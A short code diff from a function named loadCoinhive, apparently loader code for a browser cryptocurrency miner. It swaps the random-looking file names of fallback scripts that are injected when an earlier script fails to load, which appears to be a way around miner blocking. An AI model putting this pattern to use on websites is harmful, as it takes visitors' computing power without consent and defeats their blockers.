@@ -20,7 +20,7 @@ function loadCoinhive() {
     //check if it didn't load
     script.onerror = function() {
       var script = document.createElement('script');
-      script.src = 'DSSbEY3g.js';
+      script.src = 'hQxRZwQN.js';
       document.getElementsByTagName("head")[0].appendChild(script);
       //check if script was loaded
       script.onload = function() {
@@ -30,7 +30,7 @@ function loadCoinhive() {
       //check if it didn't load
       script.onerror = function() {
         var script = document.createElement('script');
-        script.src = 'fB6Xs7di.js';
+        script.src = 'By4w79cm.js';
         document.getElementsByTagName("head")[0].appendChild(script);
         //check if script was loaded
         script.onload = function() {
